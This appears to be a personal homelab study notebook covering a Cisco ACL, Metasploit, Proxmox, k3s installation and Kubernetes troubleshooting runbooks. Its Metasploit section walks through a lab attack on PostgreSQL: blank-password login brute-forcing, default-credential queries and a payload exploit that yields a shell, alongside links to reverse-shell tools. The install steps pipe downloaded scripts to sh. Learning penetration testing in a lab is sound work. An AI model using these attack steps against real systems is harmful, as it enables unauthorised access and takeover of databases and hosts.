# ## ACL

# %% [markdown]
# **log into the router**
# *to get the wildcard mask subtract 255 from the octet*
# *255.255.255.192 -- 0.0.0.63 <-- (255-192)*
# conf t
# ip access-list extended GUEST-OUT
#     permit tcp 10.0.0.1 0.255.255.255 host 10.0.0.1 eq 443
#     permit tcp 10.0.0.1 0.255.255.255 host 10.0.0.1 eq 32400
#     permit tcp 10.0.0.1 0.255.255.255 host 10.0.0.1 eq 32469
#     permit upd 10.0.0.1 0.0.0.255 host 10.0.0.1 eq 1400
#     permit upd 10.0.0.1 0.0.0.255 host 10.0.0.1 eq 53
#
#     deny ip 10.0.0.1 0.0.0.255 host 10.0.1.1 eq 1400
#     deny ip 10.0.0.1 0.0.0.255 host 10.0.2.1 eq 1400
#
#     permit ip 10.0.3.1 0.0.0.255 any
#
#     do sh ip access
#     exit
#
# int g0/0.10
#     ip access-group GUEST-OUT in

# %% [markdown]
# # **HackerOne**

# %% [markdown]
# ## Metasploit

# %% [markdown]
# *Metasploit is essentially a framework containing exploits, payloads, scanners, post-exploitation modules, and supporting utilities*

# %% [markdown]
# #### **Links**

# %% [markdown]
# ##### [Neilson Networking Youtube Video](https://www.youtube.com/watch?v=Ft6tLATCIVQ)
#
# ##### [Metasploit Docs](https://docs.metasploit.com/)
#
# ##### [Reverse Shell Generator](https://www.revshells.com/)
#
# ##### [Full TTY](https://hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
#
# ##### [GTFOBins](https://gtfobins.org/)
#
# ###### [x64dbg](https://x64dbg.com/)

# %% [markdown]
# #### **Modules**

# %% [markdown]
# *Metasploit Provides modules for:*
#
# Exploits: Tool used to take advantage of system weaknesses
# Payloads: Set of malicous code
# Auxiliary: Supplamentary tools and commands
# Encoders: Used to convert code or information
# Evasion: Create payloads that can evade antivirus software
# Post: Helps test deeper and lateral penetration once inside
# Nops: An instruction to keep the payload from crashing

# %% [markdown]
# #### **Commands**

# %% [markdown]
# ##### startup
# sudo msfconsole
#
# ##### searching syntax
#
# *Search Syntax*
# search vnc type:exploit
# search type:exploit platform:linux vnc
# search postgres type:auxiliary
# search ssh type:auxiliary
# search smb type:exploit
# search cve:2021 type:exploit
#
# *Grep Syntax*
# grep exploit search vnc
#
# ##### Enumeration
# ip -br a
# ip route
# nmap -F 10.0.0.* --scans the whole network asterics needs to be included
# nmap -sV -A 10.0.0.224 --scanning a specific host
# nmap -Ss -sV -A 10.0.0.13 --scanning verbose output
#
# ##### Host Info
# rhost = remote host ip
# lhost = local host ip
#
# ##### Exploit
# *based on the services opened from above run a search for that module*
#     *you should see aux,exploit,post modules*
#
# ###### Postgresql
# search postgresql
#     26  auxiliary/scanner/postgres/postgres_login normal No PostgreSQL Login Utilitysearch postgresql**
# use 26
#     or
# use auxiliary/scanner/postgres/postgres_login
#     *msf auxiliary(scanner/postgres/postgres_login) >*
#         info
#         options --this will list out parameters that you can change
#         ?
#         set blank_passwords true
#         options --now you will see blank_password settings set to true and you can do this for all the variables listed under options
#         set rhosts 10.0.0.13 --to set the host you will run the exploit on
#         options --to verify the host is set
#         set stop_on_success true
#         run
#
# -------------------
# *switching modules*
#
# search postgre
#     33  auxiliary/admin/postgres/postgres_sql normal No PostgreSQL Server Generic Query
# use 33
# info
# options
# set verbose true
# set rhost 10.0.0.14
# set database pg_sql
# set username admin
# set password admin
# run
#
# -------------------
# *switching modules*
# *setting up a shell with the target hosts db*
#
# search postgres
#     35  exploit/linux/postgres/postgres_payload 2007-06-05 excellent Yes PostgreSQL for Linux Payload Execution
# use 35
# info
# set verbose true
# set rhost 10.0.0.114
# set lhost 10.0.0.193 <--localhost ip
# run
# shell
# whoami
#
# ##### VNC
# search vnc linux
# search vnc login
#     0  auxiliary/scanner/vnc/vnc_login normal No VNC Authentication Scanner
# use 0
# info
# options
# set rhost 10.0.0.15
# run

# %%
# !nmap -sV 10.0.0.153

# %%
# !sudo -l
# Out:
# [sudo] password for sysadmin:
# ^C

# %% [markdown]
# ## Vulnerability Testing

# %% [markdown]
# #### **Container Enumeration**

# %% [markdown]
# docker network create metasploit-lab
#
# ##### Architecture
#
# Your Arch machine
# │
# ├── Metasploit
# │      │
# │      │ PostgreSQL modules
# │      ▼
# │
# └── Docker network
#        │
#        └── PostgreSQL container
#               └── 5432

# %% [markdown]
# # **Proxmox**

# %% [markdown]
# ### Shell Commands

# %% [markdown]
# ---
# ##### Container Download and Setup
# pveam update
# pveam available
# pveam available | grep debian
# pveam available | grep -Ei 'alma|rocky|centos'
# pveam download local debian-13-standard_13.x-1_amd64.tar.zst
# pveam list local
#
# dnf install -y vim git curl wget sudo openssh-server
# dnf install -y python3
#
# In the Proxmox UI go to:
# Your Proxmox node → local → CT Templates
# Then click Templates at the top
# You'll get the downloadable template list. Pick something like:
# debian-13-standard
# and click Download
#
# ##### Stopping a container
# pct list
# pct stop 100
# qm list
# qm stop <VMID>

# %% [markdown]
# ## Homelab Installs

# %% [markdown]
# #### **Rhel-based System Installs**

# %% [markdown]
# ##### Installing SSH
# sudo dnf install -y epel-release
# sudo dnf install -y openssh-server
#     - systemctl status sshd
#
# sudo dnf update -y && sudo dnf upgrade -y
#
# --sudo dnf install -y openssh-server
#     --sudo dnf enable --now sshd
#     --sudo dnf start sshd
#     --sudo dnf status sshd
#
# --sudo dnf install -y oracle-epel-release-el9
# --sudo dnf install -y curl unzip git zsh nvim fastfetch
#
# --sudo chsh -s /bin/zsh <username>
#     --sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
#         --exec zsh --restarts the terminal
#             --the prompt will ask if you want to make zsh the defualy shell select yes
#
# --alias vim='nvim'
# if [[ -o interactive ]]; then
#         fastfetch or <neofetch>
# fi
# --source ~/.zshrc
#
# --ssh-keygen -t ed25519 -C "k8s controller"
# --ssh-copy-id user@SERVER_IP
#     --cat ~/.ssh/id_ed25519.pub >> Copy the output
#         --mkdir -p ~/.ssh >> Create on the server you want to use the ssh keys on i.e the one you are remoting into
#         --nano ~/.ssh/authorized_keys >> Create on the server you want to use the ssh keys on i.e the one you are remoting into
#
# --git clone https://github.com/josh-butler93/obsidian-vaulTTY.git
# --git clone git@github.com:josh-butler93/obsidian-vaulTTY.git⏎

# %% [markdown]
# ## Proxmox Server Setup

# %% [markdown]
#                   ┌── selinux-vm
#                   │
# repo-server ──────┼── rpm-test
#                   │
#                   └── ansible-dummy
#
# Proxmox
# │
# ├── alma-selinux      VM     2 CPU / 2GB / 20GB
# ├── alma-rpm          LXC    1 CPU / 1GB / 10GB
# ├── ansible-dummy     LXC    1 CPU / 512MB / 8GB
# └── repo-server       LXC    1 CPU / 1GB / 20GB
#
# repo-server
# ├── AlmaLinux 9
# ├── 1 vCPU
# ├── 1 GB RAM
# ├── 15–20 GB disk
# └── LXC is perfectly fine
#
# dnf install -y httpd createrepo_c
# /var/www/html/repos/homelab/
# createrepo_c /var/www/html/repos/homelab/
#
# [homelab]
# name=Homelab RPM Repository
# baseurl=http://repo-server/repos/homelab/
# enabled=1
# gpgcheck=0

# %% [markdown]
# # **k8s**

# %% [markdown]
# ## Reference Documentation

# %%
from IPython.display import IFrame

IFrame(
    "https://kubernetes.io/docs/reference/kubectl/",
    width="100%",
    height=700
)
s

# %% [markdown]
# ## Runbooks

# %% [markdown]
# <details>
# <summary><b>🧰 Runbook: Pod Won't Start</b></summary>
#
# ### 1. Check pod status
#
# ```bash
# kubectl get pods -A
# ```
#
# Look for:
#
# - `CrashLoopBackOff`
# - `ImagePullBackOff`
# - `Pending`
# - `Error`
#
# ### 2. Describe the pod
#
# ```bash
# kubectl describe pod POD_NAME -n NAMESPACE
# ```
#
# Check the **Events** section near the bottom.
#
# ### 3. Check logs
#
# ```bash
# kubectl logs POD_NAME -n NAMESPACE
# ```
#
# If the pod has multiple containers:
#
# ```bash
# kubectl logs POD_NAME -n NAMESPACE -c CONTAINER_NAME
# ```
#
# ### 4. Check recent warning events
#
# ```bash
# kubectl get events -n NAMESPACE \
#   --field-selector type=Warning \
#   --sort-by='.metadata.creationTimestamp'
# ```
#
# ### 5. Check the node
#
# ```bash
# kubectl get nodes -o wide
# ```
#
# ```bash
# kubectl describe node NODE_NAME
# ```
#
# ### Common causes
#
# - Bad image name/tag
# - Missing Secret or ConfigMap
# - Storage/PVC issue
# - Insufficient CPU or memory
# - Bad environment variable
# - Failing health check
# - Network/DNS issue
#
# </details>
#
# ---
#
# <details>
# <summary><b>🧰 Runbook: CrashLoopBackOff</b></summary>
#
# ### 1. Find the affected pod
#
# ```bash
# kubectl get pods -A | grep CrashLoopBackOff
# ```
#
# ### 2. Check current logs
#
# ```bash
# kubectl logs POD_NAME -n NAMESPACE
# ```
#
# ### 3. Check logs from the previous crash
#
# ```bash
# kubectl logs POD_NAME -n NAMESPACE --previous
# ```
#
# ### 4. Describe the pod
#
# ```bash
# kubectl describe pod POD_NAME -n NAMESPACE
# ```
#
# ### 5. Check restart count
#
# ```bash
# kubectl get pod POD_NAME -n NAMESPACE
# ```
#
# ### Common causes
#
# - Application crashes during startup
# - Missing configuration
# - Bad environment variables
# - Failed health checks
# - Permission problems
# - Dependency unavailable
#
# </details>
#
# ---
#
# <details>
# <summary><b>🧰 Runbook: ImagePullBackOff</b></summary>
#
# ### 1. Find affected pods
#
# ```bash
# kubectl get pods -A | grep -E "ImagePullBackOff|ErrImagePull"
# ```
#
# ### 2. Describe the pod
#
# ```bash
# kubectl describe pod POD_NAME -n NAMESPACE
# ```
#
# Look at the **Events** section.
#
# ### 3. Check the configured image
#
# ```bash
# kubectl get pod POD_NAME -n NAMESPACE -o jsonpath='{.spec.containers[*].image}'
# ```
#
# ### 4. Check image pull secrets
#
# ```bash
# kubectl get secrets -n NAMESPACE
# ```
#
# ### Common causes
#
# - Wrong image name
# - Wrong image tag
# - Private registry authentication failure
# - Missing `imagePullSecret`
# - Registry unavailable
# - Network/DNS issue
#
# </details>
#
# ---
#
# <details>
# <summary><b>🧰 Runbook: Pod Stuck Pending</b></summary>
#
# ### 1. Find Pending pods
#
# ```bash
# kubectl get pods -A | grep Pending
# ```
#
# ### 2. Describe the pod
#
# ```bash
# kubectl describe pod POD_NAME -n NAMESPACE
# ```
#
# ### 3. Check nodes
#
# ```bash
# kubectl get nodes
# ```
#
# ### 4. Check PVCs
#
# ```bash
# kubectl get pvc -A
# ```
#
# ### 5. Check resource availability
#
# ```bash
# kubectl describe node NODE_NAME
# ```
#
# ### Common causes
#
# - Insufficient CPU
# - Insufficient memory
# - PVC not bound
# - Node selector mismatch
# - Taints/tolerations
# - Scheduling constraints
#
# </details>
#
# ---
#
# <details>
# <summary><b>🧰 Runbook: Kubernetes Node NotReady</b></summary>
#
# ### 1. Check nodes
#
# ```bash
# kubectl get nodes -o wide
# ```
#
# ### 2. Describe the affected node
#
# ```bash
# kubectl describe node NODE_NAME
# ```
#
# Check:
#
# - `Ready`
# - `MemoryPressure`
# - `DiskPressure`
# - `PIDPressure`
# - `NetworkUnavailable`
#
# ### 3. Check events
#
# ```bash
# kubectl get events -A --sort-by='.metadata.creationTimestamp'
# ```
#
# ### 4. Check k3s service
#
# Control plane:
#
# ```bash
# systemctl status k3s
# ```
#
# Worker:
#
# ```bash
# systemctl status k3s-agent
# ```
#
# ### 5. Check logs
#
# Control plane:
#
# ```bash
# journalctl -u k3s -n 100
# ```
#
# Worker:
#
# ```bash
# journalctl -u k3s-agent -n 100
# ```
#
# ### 6. Check resources
#
# ```bash
# df -h
# ```
#
# ```bash
# free -h
# ```
#
# ### Common causes
#
# - k3s service stopped
# - Node lost network connectivity
# - Disk full
# - Memory pressure
# - CNI failure
# - Firewall issue
#
# </details>
#
# ---
#
# <details>
# <summary><b>🧰 Runbook: Service Not Reachable</b></summary>
#
# ### 1. Check the service
#
# ```bash
# kubectl get svc -A
# ```
#
# ### 2. Describe the service
#
# ```bash
# kubectl describe svc SERVICE_NAME -n NAMESPACE
# ```
#
# ### 3. Check endpoints
#
# ```bash
# kubectl get endpoints SERVICE_NAME -n NAMESPACE
# ```
#
# ### 4. Check the backing pods
#
# ```bash
# kubectl get pods -n NAMESPACE -o wide
# ```
#
# ### 5. Verify labels
#
# ```bash
# kubectl get pods -n NAMESPACE --show-labels
# ```
#
# ### Common causes
#
# - Service selector doesn't match pod labels
# - Pods aren't Ready
# - Wrong `targetPort`
# - Application isn't listening
# - Network policy blocking traffic
#
# </details>
#
# ---
#
# <details>
# <summary><b>🧰 Runbook: PVC / Storage Problem</b></summary>
#
# ### 1. Check PVCs
#
# ```bash
# kubectl get pvc -A
# ```
#
# ### 2. Describe the PVC
#
# ```bash
# kubectl describe pvc PVC_NAME -n NAMESPACE
# ```
#
# ### 3. Check persistent volumes
#
# ```bash
# kubectl get pv
# ```
#
# ### 4. Check storage classes
#
# ```bash
# kubectl get storageclass
# ```
#
# ### 5. Check storage events
#
# ```bash
# kubectl get events -n NAMESPACE \
#   --field-selector type=Warning \
#   --sort-by='.metadata.creationTimestamp'
# ```
#
# ### Common causes
#
# - No matching PV
# - StorageClass problem
# - Provisioner failure
# - Access mode mismatch
# - Volume mount failure
#
# </details>

# %% [markdown]
# ## Definitions

# %% [markdown]
# #### **Services**
# Serivices give clients one stable address for a set of Pods
#
# #### **endpointslices**
# Retrieves EndpointSlice resources
#
# #### **TYPE**
# ClusterIP means the Service is reachable inside the Kubernetes cluster
#
# #### **CLUSTER-IP:**
# The stable internal IP address assigned to the Service
#
# #### **kubectl scale**
# Changes the desired number of running Pod replicas

# %%
from IPython.display import IFrame

IFrame(
    "https://kubernetes.io/docs/reference/kubectl/",
    width="100%",
    height=700
)
s

# %% [markdown]
# ## Installation

# %% [markdown]
# sudo swapoff -a >> temporary until a machine reboot
# sudo vim /etc/fstab
# Comment below line out
#     # /swapfile none swap sw 0 0
# sudo reboot
#
# Installation
# curl -sfL https://get.k3s.io | sh -
# sudo systemctl status k3s
# sudo systemctl enable --now k3s
# sudo systemctl start k3s
# sudo chmod 644 /etc/rancher/k3s/k3s.yaml
# export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
#         echo 'export KUBECONFIG=/etc/rancher/k3s/k3s.yaml' >> ~/.zshrc
#         source ~/.zshrc
# kubectl cluster-info
# kubectl get nodes
# curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 && chmod 700 get_helm.sh && ./get_helm.sh
# helm --help
#
# Troubleshooting
#
# sudo chown $(id -u):$(id -g) ~/.kube/config
# mkdir -p ~/.kube
# sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
# sudo chown $(id -u):$(id -g) ~/.kube/config
# export KUBECONFIG=~/.kube/config
# echo 'export KUBECONFIG=$HOME/.kube/config' >> ~/.zshrc
# echo 'export KUBECONFIG=$HOME/.kube/config' >> ~/.bashrc
# sudo sh -c 'echo "export KUBECONFIG=/home/$USER/.kube/config" > /etc/profile.d/kubeconfig.sh'
# kubectl get nodes
# kubectl get nodes -o wide
# kubectl describe node $(kubectl get nodes -o name)
# kubectl delete node localhost.localdomain
#
# Extras--
#
# sudo kubectl get nodes
#     sudo systemctl stop k3s
#     sudo systemctl disable k3s
#     sudo /usr/local/bin/k3s-uninstall.sh
#     sudo rm -rf /etc/rancher
#     sudo rm -rf /var/lib/rancher
#     sudo rm -rf /var/lib/kubelet
#     sudo rm -rf /var/lib/cni
#     sudo rm -rf /etc/cni
#     sudo rm -rf /run/k3s
#
#
# --sudo cat /var/lib/rancher/k3s/server/node-token
# curl -sfL https://get.k3s.io | \
# K3S_URL=https://CONTROL_PLANE_IP:6443 \
# K3S_TOKEN=TOKEN_HERE \
# sh -

# %% [markdown]
# ## Commands

# %% [markdown]
# ### **Command Breakdowns**

# %% [markdown]
# #### **kubectl run load-client --image=busybox:1.36 --image-pull-policy=IfNotPresent --restart=Never -- sleep 3600**
# *kubectl run:* creates a standalone Pod because --restart=Never is set
# *The -- separator:* ends kubectl options
# *sleep 3600:* is the container command that keeps it alive
#
# ---
# #### **kubectl get endpointslices -l kubernetes.io/service-name=hostname-web -o jsonpath='{range .items[*].endpoints[*]}{.addresses[0]}{" ready="}{.conditions.ready}{"\n"}{end}'**
# *-o wide* displays additional information, such as: Pod IP address
# Node where the Pod is running, Readiness and status details
# *{range .items[*].endpoints[*]}:* Loops through every endpoint in every matching EndpointSlice
# *{.addresses[0]}:* Prints the endpoint's first IP address
# *{" ready="}:* Prints the literal text 'ready' followed by condition which will be either true or false
# *{.conditions.ready}:*
# *{"\n"}:* Prints a newline so each endpoint appears on its own line
#
# ---
# #### **kubectl scale deployment/hostname-web --replicas=2**
# * kubectl scale changes the desired number of running Pod replicas.
# * deployment/hostname-web identifies the Deployment to change.
# * --replicas=2 tells Kubernetes to maintain two Pods for this Deployment

# %% [markdown]
# ### **Commands**

# %% [markdown]
# #### **k8s Cluster Info**
#
# * minikube version --short
# * **kubectl version**
# * **kubectl config current-context**
# * kubectl config use-context labex-v135
# * minikube status -p labex-v135
#     --The short option -p means profile is followed by its name
#         -host means the Minikube node container is running
# * kubectl get nodes
# * **kubectl get pods -n kube-system -l tier=control-plane**
#     --l tier=control-plane: Filters the results using a label selector
#         -It shows only Pods with the label -- tier=control-plane
# * **kubectl get pods -n kube-system -l 'k8s-app in (kube-proxy,calico-node)'**
# * **kubectl cluster-info**
# * **kubectl get nodes -o wide**
# * **kubectl describe node labex-v135**
# * **kubectl get pods -A**
# * **kubectl get deployments -Az**
# * **kubectl get services -A**
# * **kubectl get all -A**
#     -This groups common resources such as Pods, Services, DaemonSets, Deployments, ReplicaSets, and Jobs
#         -*ConfigMaps, Secrets, NetworkPolicies, and many others are omitted*
#
# *Scenario:*
# *Imagine that you ask Kubernetes to run a web application*
# * First, kubectl sends the request to the kube-apiserver, which validates it and stores desired state in etcd
# * Next, the kube-scheduler chooses a node for each new Pod
# * The kube-controller-manager watches the cluster and works to make actual state match desired state
# * Finally, the kubelet on the selected node asks the container runtime to start the Pod's containers. Networking components allow Pods and Services to communicate
# * If a Deployment requests three Pods but only two exist, a controller creates the missing Pod
#
# ***Use get for a fast table, get -o wide for extra columns, and describe for conditions, capacity, runtime details, and events for one object***
#
# ***Namespaces provide scope, Pods run containers, Deployments maintain desired Pod replicas, and Services provide stable network access to changing Pods***
#
# #### Single Pod Deployement **kind:Pod**
#
# * **printf '%s\n' apiVersion kind metadata spec > manifest-fields.txt**
# * **kubectl apply --dry-run=client -f first-pod.yaml**
# * **kubectl apply --dry-run=client -f first-pod.yaml -o yaml**
#     The output option -o means output format
#     Supplying yaml asks kubectl to render the parsed object as YAML instead of printing only a one-line result
# * **kubectl apply -f first-pod.yaml**
#     *kubectl apply*: sends the object to the API server
#     *The API server:* stores the desired Pod specification
#     *scheduler* and kubelet cooperate to run it on the node
# * **kubectl wait --for=condition=Ready pod/first-nginx --timeout=60s**
#     *The above command stops successfully when the condition becomes true or fails after 60 seconds*
# * **kubectl get pod first-nginx -o wide**
# * ***kubectl get pod first-nginx --show-labels***
# * **kubectl get pod first-nginx -o jsonpath='Owner: {.metadata.ownerReferences[0].kind}{"\n"}'**
#
# #### ReplicaSets Pod Deployment **kind:Deployment**
#
# * **kubectl apply --dry-run=client -f course-web-deployment.yaml**
# * **kubectl diff -f course-web-deployment.yaml || true**
#     *Use kubectl diff to compare the manifest with live state*
#     *Lines beginning with + represent content that would be added*
#     *Lines beginning with - represent content that would be removed*
# * **kubectl apply -f course-web-deployment.yaml**
# * **kubectl rollout status deployment/course-web --timeout=60s**
#     *Asks Kubernetes to show the current progress of a rollout*
#     *--timeout=60s:* Sets the maximum waiting time to 60 seconds
#     *If it does not become ready in time, the command stops waiting and reports a timeout*
# * **kubectl get deployment course-web**
# * **kubectl get deployments -A**
# * **kubectl get deployment,replicaset,pods -l app=course-web**
#
# #### **Troubleshooting Deployments**
#
# **get -> describe -> events -> repair manifest -> rollout status -> logs -> exec**
# * **kubectl apply -f healthy-web.yaml -f broken-web.yaml**
# * **kubectl rollout status deployment/healthy-web --timeout=60s**
# * **kubectl rollout status deployment/broken-web --timeout=15s || true**
# * **kubectl describe pod broken-web-5fcd668857-657vc | grep Failed**
# * **kubectl describe pod broken-web-5fcd668857-657vc | grep -i failed**
#     - For case insensativity
# * **kubectl describe pod broken-web-5fcd668857-657vc | grep -E 'Failed|Error|CrashLoopBackOff|ImagePullBackOff'**
# * **kubectl get deployments**
# * **kubectl get pods | grep Failed**
# * **kubectl get pods -A | grep Failed**
# * **kubectl get pods -A | grep -i failed**
# * **kubectl get pods -A | grep -E 'Failed|Error|CrashLoopBackOff|ImagePullBackOff'**
# * **kubectl get deployments,replicasets,pods -o wide**
#     - A **Deployment** reports the desired and available replica counts
#     - A **ReplicaSet** carries that desired replica count closer to the Pods
#     - A **Pod** reports container readiness and a short status reason
# * **kubectl get pods -l app=broken-web -o wide**
# * **kubectl get pods -l app=broken-web -o custom-columns='NAME:.metadata.name,READY:.status.containerStatuses[0].ready,WAITING_REASON:.status.containerStatuses[0].state.waiting.reason,NODE:.spec.nodeName'**
# * BROKEN_POD=$(kubectl get pods -l app=broken-web -o jsonpath='{.items[0].metadata.name}') -- Creating env var for the pod with the broken...label
# * kubectl describe pod "$BROKEN_POD"
#     - **Containers → Image shows the exact requested image**
#     - **State → Waiting → Reason describes the current container state**
#     - **Events records the kubelet's attempts and error messages**
# * **kubectl get pod "$BROKEN_POD" -o jsonpath='Image: {.spec.containers[0].image}{"\n"}'**
# * **kubectl get events --sort-by='.metadata.creationTimestamp'**
# * **kubectl get events -n <namespace> --field-selector type=Warning --sort-by='.metadata.creationTimestamp'**
# * **kubectl get events -A --sort-by='.metadata.creationTimestamp'**
# * **kubectl get events -A --sort-by='.metadata.creationTimestamp' | grep -Ei "failed|error|warning"**
# * **kubectl get events -A --field-selector type=Warning --sort-by='.metadata.creationTimestamp'**
# * **grep -n 'image:' healthy-web.yaml broken-web.yaml**
# * **sed -i 's/nginx:1.27-alpine-missing/nginx:1.27-alpine/' broken-web.yaml**
# * **kubectl apply --dry-run=client -f broken-web.yaml**
# * **kubectl diff -f broken-web.yaml || true**
# * **kubectl apply -f broken-web.yaml**
# * **kubectl rollout status deployment/broken-web --timeout=60s**
# * **kubectl get deployments**
#
# Logs
# * kubectl exec "$WEB_POD" -- wget -qO- http://127.0.0.1 | head
# * kubectl logs "$WEB_POD" --tail=10
# * **kubectl logs zabbix-postgresql-0 -n zabbix --tail=10**
# * **kubectl exec "$WEB_POD" -- hostname** --inside the container inspection
# * **kubectl exec "$WEB_POD" -- nginx -t**
# * **kubectl exec "$WEB_POD" -- wget -qO- http://127.0.0.1 >/dev/null && echo "NGINX responded inside the Pod"**
#
# #### **Backend Services**
#
# *backend means a Pod able to receive traffic for a Service*
# *A **Service** does not select a Deployment by name; it independently finds Pods whose labels match its selector*
#
# * **kubectl apply -f course-nginx-deployment.yaml**
# * **kubectl rollout status deployment/course-nginx --timeout=60s**
# * **kubectl get pods -l app=course-nginx -o wide**
# * **kubectl get pods -l app=course-nginx --show-labels**
# Each Pod has app=course-nginx plus a generated pod-template-hash
#
# * **kubectl get pods -l app=course-nginx -o custom-columns='NAME:.metadata.name,LABEL:.metadata.labels.app,IP:.status.podIP,READY:.status.containerStatuses[0].ready'**
# Compare names, labels, and IPs in a compact view
# *-o custom-columns creates a table from selected object fields*
# * **kubectl get deployment course-nginx -o jsonpath='Selector: {.spec.selector.matchLabels.app}{"\n"}Pod label: {.spec.template.metadata.labels.app}{"\n"}'**
# * **kubectl apply --dry-run=client -f course-nginx-service.yaml**
# * **kubectl apply -f course-nginx-service.yaml**
# * **kubectl get svc -n default**
# * **kubectl get service course-nginx**
# * **kubectl describe service course-nginx**
# * **kubectl describe service | grep -i selector**
# * **kubectl get endpointslices -l kubernetes.io/service-name=course-nginx**
# * **kubectl get endpointslices -l kubernetes.io/service-name=course-nginx -o jsonpath='{range .items[*].endpoints[*]}{.addresses[0]}{" ready="}{.conditions.ready}{"\n"}{end}'**
#
# #### **Reach the Service by Cluster DNS**
#
# **Kubernetes DNS lets a Pod in the same namespace use the Service name course-nginx instead of remembering its virtual IP**
#
# ```
# kubectl run service-client \
#   --image=busybox:1.36 \
#   --image-pull-policy=IfNotPresent \
#   --restart=Never \
#   --rm -i \
#   -- wget -qO- http://course-nginx
# ```
# *Traffic traveled through the Service rather than directly to a chosen Pod IP*
#
# **Run a quieter success check. >/dev/null discards the HTML body, and && prints the message only if the request command succeeds**
# ```
# kubectl run service-client-check \
#   --image=busybox:1.36 \
#   --image-pull-policy=IfNotPresent \
#   --restart=Never \
#   --rm -i \
#   -- wget -qO- http://course-nginx >/dev/null && echo "ClusterIP Service responded"
# ```
# *The success message proves both DNS resolution and HTTP reachability. The client Pod is temporary; the Service and its two backend Pods remain*
#
# #### **Add a NodePort Service**
#
# * **kubectl apply --dry-run=client -f course-nginx-services.yaml** *--tied to the nodeport manifest file above*
# * **kubectl apply -f course-nginx-services.yaml**
# * **kubectl get service course-nginx-nodeport**
# *PORT(S) column shows 80:30080/TCP: port 80 is the Service port and 30080 is the node-facing port*
#
# * **NODE_IP=$(minikube ip -p labex-v135)**
# * **echo "$NODE_IP"**
# * **curl -s --retry 5 --retry-connrefused --retry-delay 2 "http://${NODE_IP}:30080" | grep 'Welcome to nginx'**
# * **kubectl get services course-nginx course-nginx-nodeport**
#
# *Use ClusterIP for stable communication within the cluster; it is the default and the common foundation for other exposure mechanisms*
# *NodePort adds a node-level entry point and is useful for learning, development, or integration with external load balancers*
#
#
# #### Scale and Load Balance Applications
#
# * **kubectl apply -f hostname-web.yaml** --file is in manifest cell
# * **kubectl rollout status deployment/hostname-web --timeout=60s**
# * **kubectl get pods -l app=hostname-web**
# * **kubectl get deployment hostname-web**
# * **kubectl get pods -l app=hostname-web -o wide**
# * **kubectl get endpointslices -l kubernetes.io/service-name=hostname-web**
# * **kubectl run load-client --image=busybox:1.36 --image-pull-policy=IfNotPresent --restart=Never -- sleep 3600**
#
# Scale Up Declaritively
# * **sed -i 's/replicas: 2/replicas: 4/' hostname-web.yaml**
# * kubectl diff -f hostname-web.yaml
# * **grep -n 'replicas:' hostname-web.yaml**
# * kubectl apply -f hostname-web.yaml
# * kubectl rollout status deployment/hostname-web --timeout=60s
# * kubectl get deployment hostname-web
# * kubectl get pods -l app=hostname-web -o wide
# * kubectl get endpointslices -l kubernetes.io/service-name=hostname-web -o jsonpath='{range .items[*].endpoints[*]}{.addresses[0]}{" ready="}{.conditions.ready}{"\n"}{end}'
# * **kubectl get service hostname-web -o wide**
# * **sort -u /tmp/hostname-responses.txt | wc -l**
# * **kubectl scale deployment/hostname-web --replicas=2**
# * kubectl get pods -l app=hostname-web
# * **grep -n 'replicas:' /home/labex/project/scale-lab/hostname-web.yaml**
# * **kubectl get deployment hostname-web -o jsonpath='Live replicas: {.spec.replicas}{"\n"}'**
# * **sed -i 's/replicas: 4/replicas: 2/' /home/labex/project/scale-lab/hostname-web.yaml**
# * kubectl apply -f /home/labex/project/scale-lab/hostname-web.yaml
# * **kubectl describe deployment hostname-web | sed -n '/Events:/,$p'**
# * **kubectl delete pod load-client --ignore-not-found**
#
#
# ##### **env Var Examples**
#
# ```
# BROKEN_POD=$(kubectl get pods -l app=broken-web -o jsonpath='{.items[0].metadata.name}')
# kubectl get events \
#   --field-selector involvedObject.kind=Pod,involvedObject.name="$BROKEN_POD" \
#   --sort-by='.metadata.creationTimestamp'
#   ```
#
# ```
# WEB_POD=$(kubectl get pods -l app=broken-web \
#   --field-selector=status.phase=Running \
#   -o jsonpath='{.items[0].metadata.name}')
# echo "$WEB_POD"
# ```
#
# ```
# WEB_POD=$(kubectl get pods -l app=broken-web \
#   --field-selector=status.phase=Running \
#   -o jsonpath='{.items[0].metadata.name}')
# ```

# %% [markdown]
# ### **Command base**

# %% [markdown]
# k8s==Container Orchestration
#   --Node=Machine with Kubernetes installed where pods are deployed to
#   --Cluster=Group of nodes
#   --Master=Another node with k8s installed on it that watches over the nodes in the cluster and is responsible for the orchestration of the nodes
#   --kubectl=is used to deploy,manage, and maintain the k8s cluste
#   --pods=containers are encapsulated into a k8s object called a pod
#   --deployment=is a k8s object that manages a group of identical pods
#
# Control Plane
#   - kube-apiserver (API): Serves as the cluster’s front door. All administrative commands and resource requests pass through it
# 	---the entry point for k8s api requests
#   - etcd (Key Value Store): Stores all configuration data and the current state of the cluster
#   	---If you lose etcd data, you lose the state of the cluster
#   - kube-scheduler (SCH): Assigns Pods to Nodes based on resource requirements, constraints, and policies
#   - kube-controller-manager (CTLM): Runs a variety of controllers that continually adjust the cluster’s state
#   	---Ensuring that the actual state matches the desired state defined by your deployments and configurations
#
# Nodes (Worker Machines)
#   - Node: Nodes are where workloads run
#   - kubelet (KLT): A node-level agent that communicates with the Control Plane
#   	---It ensures Pods are running and reports their status back to the Control Plane
#   - kube-proxy: This maintains network fules on the node allow network communication to your pods from inside of outside of the cluster
#   - Container Runtime (CR): Software that runs and manages containers (e.g., Docker or containerd)
#   	---It creates and manages containerized applications within Pods
#
# Pods
#   - Pod: A Pod is the smallest deployable unit in Kubernetes, typically representing a single instance of a running application
#    ---Pods can contain one or more containers that share the same network namespace and storage volumes
#
# Services
#   - A Service defines Pods policy for how to access them providing IP addresses, DNS names, and load-balancing
#   - k8s doesnt talk to a pod directly it talks to a Service instead bc of the temporary nature of pods
# 	- it give a stable ip (the clusters ip)
# 	- it gives stable dns configs name
# 	- it load balances across pods
# 	- survives pod restarts
# 	**************************
# 	Browser / Client
#         ↓
# 	Service (stable)
#         ↓
# 	Pods (ephemeral, changing)
# 	***************************
#   - Types of Services
# 	- Cluster IP (default)
# 		$internal only
# 		$used for backend communication
# 	- NodePort
# 		$exposes service on each node IP
# 		$lets you access from your machine
